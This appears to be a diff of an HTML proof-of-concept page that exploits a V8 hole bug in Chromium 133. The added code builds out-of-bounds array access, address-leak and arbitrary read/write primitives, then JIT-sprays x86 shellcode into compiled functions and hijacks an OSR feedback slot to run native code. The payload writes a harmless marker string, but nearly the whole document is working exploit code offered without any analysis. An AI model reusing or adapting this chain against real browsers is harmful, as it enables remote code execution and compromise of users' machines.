@@ -1,1 +1,46 @@
-<!doctype html><meta charset=utf-8><title>CASI V81 M133 SFI STATE</title><style>body{font:14px monospace;white-space:pre-wrap}</style><b>CASI V81 CHROMIUM 133 SFI STATE 0 VS 16 CALLS</b><pre id=o>START</pre><script>var out=document.getElementById("o"),b=new ArrayBuffer(8),f=new Float64Array(b),u=new Uint32Array(b);function ftoi(v){f[0]=v;return BigInt(u[0])+(BigInt(u[1])<<32n)}function setbits(lo,hi){u[0]=Number(lo);u[1]=Number(hi);return f[0]}function hax(t){let x;delete x?.[y]?.a;let hole=y;let y;let o={};o.maybe_hole=t?hole:"not the hole";let len=o.maybe_hole.length,sign=Math.sign(len),i1=2-(sign+1),i2=5-(i1+4)>>1,i3=2*i2+2,i4=i3>>1,i5=i4*1000;let a=new Array(8);a[0]=13.37;a[i5]=13.37;return a}try{let src="";for(let q=0;q<512;q++)src+="let v"+q+"=0;";let fn0=new Function("p1",src+"return 0;"),fn16=new Function("p1",src+"return 16;");for(let k=0;k<16;k++)fn16(k);let normal=hax(false);for(let j=0;j<65536;j++)hax(false);for(let j=0;j<65536;j++)hax(false);let c=hax(true);let fa=[1111.1111,2222.2222,3333.3333];let oa={p:"AAAA"},ob={p:"BBBB"},objs=[oa,ob];let rw=[4444.4444,5555.5555,6666.6666,7777.7777];let tail=[8888.8888,9999.9999];let orig30=c[30],s30=ftoi(orig30),orig41=c[41],s41=ftoi(orig41);function tag(o){objs[0]=o;c[30]=setbits(s30&0xffffffffn,0x1540d9n);let z=objs[0];c[30]=orig30;return ftoi(z)&0xffffffffn}function pair(tagged,off){c[41]=setbits(s41&0xffffffffn,tagged+off-8n);let z=rw[0];c[41]=orig41;return ftoi(z)}let t0=tag(fn0),fp0=pair(t0,0x10n),s0=fp0&0xffffffffn,sp0=pair(s0,0n);let t16=tag(fn16),fp16=pair(t16,0x10n),s16=fp16&0xffffffffn,sp16=pair(s16,0n);out.textContent=["DONE","length="+c.length,"calls0 fn=0x"+t0.toString(16)+" fpair=0x"+fp0.toString(16)+" sfi=0x"+s0.toString(16)+" sfipair=0x"+sp0.toString(16),"calls16 fn=0x"+t16.toString(16)+" fpair=0x"+fp16.toString(16)+" sfi=0x"+s16.toString(16)+" sfipair=0x"+sp16.toString(16),"restored30=0x"+ftoi(c[30]).toString(16),"restored41=0x"+ftoi(c[41]).toString(16)].join("\n")}catch(e){out.textContent="THREW\n"+e.name+"\n"+e.message}</script>
+<!doctype html><meta charset=utf-8><title>CASI V82 M133 SAFE NATIVE MARKER</title><style>body{font:14px monospace;white-space:pre-wrap}</style><b>CASI V82 CHROMIUM 133 SAFE NATIVE IN-MEMORY MARKER</b><pre id=o>START</pre><script>
+var out=document.getElementById("o"),b=new ArrayBuffer(8),f=new Float64Array(b),u=new Uint32Array(b);
+function ftoi(v){f[0]=v;return BigInt(u[0])+(BigInt(u[1])<<32n)}
+function setbits(lo,hi){u[0]=Number(lo);u[1]=Number(hi);return f[0]}
+function hax(t){let x;delete x?.[y]?.a;let hole=y;let y;let o={};o.maybe_hole=t?hole:"not the hole";let len=o.maybe_hole.length,sign=Math.sign(len),i1=2-(sign+1),i2=5-(i1+4)>>1,i3=2*i2+2,i4=i3>>1,i5=i4*1000;let a=new Array(8);a[0]=13.37;a[i5]=13.37;return a}
+try{
+ let scr_arr=Array(0x200).fill(0).map(function(_,i){return 0x21210002|(i<<7)}),outbuf=[1.1,2.2,3.3,4.4];
+ let osr_func=new Function("loop","for (let i=0; i<loop; i++);");
+ let normal=hax(false);for(let j=0;j<65536;j++)hax(false);for(let j=0;j<65536;j++)hax(false);
+ let c1=hax(true),fa1=[1111.1111,2222.2222,3333.3333],oa1={p:"AAAA"},ob1={p:"BBBB"},objs1=[oa1,ob1],rw1=[4444.4444,5555.5555,6666.6666,7777.7777],tail1=[8888.8888,9999.9999];
+ let o130=c1[30],q130=ftoi(o130),o141=c1[41],q141=ftoi(o141);
+ function tag1(o){objs1[0]=o;c1[30]=setbits(q130&0xffffffffn,0x1540d9n);let z=objs1[0];c1[30]=o130;return ftoi(z)&0xffffffffn}
+ function pair1(t,off){c1[41]=setbits(q141&0xffffffffn,t+off-8n);let z=rw1[0];c1[41]=o141;return ftoi(z)}
+ let outtag1=tag1(outbuf),outel1=pair1(outtag1,8n)&0xffffffffn,dataoff=(outel1+7n)&0xffffffffn;
+ let payload=[0,0,0,0,true];for(let i=0;i<0xa5;i++)payload.push(0x21210000+i);payload.push(true);
+ function sw(a0,a1,a2){return (0xeb000000|(a2<<16)|(a1<<8)|a0)>>1}
+ function g(a0,a1,a2){payload.push(sw(a0,a1,a2),0,0,true,0x90909090>>1,0x90909090>>1,0x90909090>>1)}
+ let offnum=Number(dataoff),bb=[offnum&255,(offnum>>>8)&255,(offnum>>>16)&255,(offnum>>>24)&255];
+ g(0x48,0x31,0xc0);g(0x50,0x90,0x90);g(0x48,0x89,0xe3);
+ for(let i=0;i<4;i++){g(0xb0,bb[i],0x90);g(0x88,0x43,i)}
+ g(0x90,0x5f,0x90);g(0x4c,0x01,0xf7);g(0x48,0x31,0xc0);g(0x90,0x90,0xfc);
+ let marker=[78,65,84,73,86,69,95,79,75,0],prev=0;for(let i=0;i<marker.length;i++){let d=(marker[i]-prev+256)&255;g(0x04,d,0xaa);prev=marker[i]}
+ g(0x90,0xc3,0x90);
+ let code_str="";for(let i=0;i<0x200;i++)code_str+="let v"+i+" = "+(payload[i]===undefined?0:payload[i])+";\n";
+ let baseline_compile=new Function("p1",code_str);for(let i=0;i<16;i++)baseline_compile(i);osr_func(0x10);
+ out.textContent="ARMED SAFE MARKER";
+ for(let j=0;j<65536;j++)hax(false);
+ let c=hax(true),fa=[1111.1111,2222.2222,3333.3333],oa={p:"CCCC"},ob={p:"DDDD"},objs=[oa,ob],rw=[4444.4444,5555.5555,6666.6666,7777.7777],tail=[8888.8888,9999.9999];
+ let o30=c[30],q30=ftoi(o30),o41=c[41],q41=ftoi(o41);
+ function tag(o){objs[0]=o;c[30]=setbits(q30&0xffffffffn,0x1540d9n);let z=objs[0];c[30]=o30;return ftoi(z)&0xffffffffn}
+ function rd64(a){c[41]=setbits(q41&0xffffffffn,a-7n);let z=rw[0];c[41]=o41;return ftoi(z)}
+ function pair(t,off){return rd64(t-1n+off)}
+ function wr32(a,v){let old=rd64(a);c[41]=setbits(q41&0xffffffffn,a-7n);rw[0]=setbits(BigInt(v)&0xffffffffn,old>>32n);c[41]=o41}
+ let outtag=tag(outbuf),outel=pair(outtag,8n)&0xffffffffn,current=(outel+7n)&0xffffffffn;
+ if(current!==dataoff){out.textContent="ABORTED BUFFER MOVED\nencoded=0x"+dataoff.toString(16)+" current=0x"+current.toString(16);throw new Error("safe abort")}
+ let stag=tag(scr_arr),sel=pair(stag,8n)&0xffffffffn,pscr=(sel+8n+0x200n)&0xffffffffn;
+ let btag=tag(baseline_compile),bsfi=pair(btag,0x10n)&0xffffffffn,bsp=pair(bsfi,0n),codeh=(bsp>>32n)&0xffffffffn;
+ let otag=tag(osr_func),fbct=pair(otag,0x18n)&0xffffffffn,fbvt=rd64(fbct-1n+4n)&0xffffffffn,slot=fbvt-1n+0x24n;
+ let oldmap=rd64(pscr-1n)&0xffffffffn,oldcode=rd64(pscr+3n)&0xffffffffn,oldslot=rd64(slot)&0xffffffffn;
+ wr32(pscr-1n,0x11f5n);wr32(pscr+3n,codeh);wr32(slot,pscr|2n);
+ osr_func(0x10000);
+ wr32(slot,oldslot);wr32(pscr-1n,oldmap);wr32(pscr+3n,oldcode);
+ let text="";for(let i=0;i<9;i++){let q=ftoi(outbuf[i>>3]),ch=Number((q>>BigInt((i&7)*8))&255n);text+=String.fromCharCode(ch)}
+ out.textContent=["RETURNED","marker="+text,"dataoff=0x"+dataoff.toString(16),"code_handle=0x"+codeh.toString(16),"feedback=restored","oob30=0x"+ftoi(c[30]).toString(16),"oob41=0x"+ftoi(c[41]).toString(16)].join("\n");
+}catch(e){if(out.textContent.indexOf("ABORTED")!==0&&out.textContent.indexOf("RETURNED")!==0)out.textContent+="\nSTOPPED\n"+e.name+"\n"+e.message}
+</script>
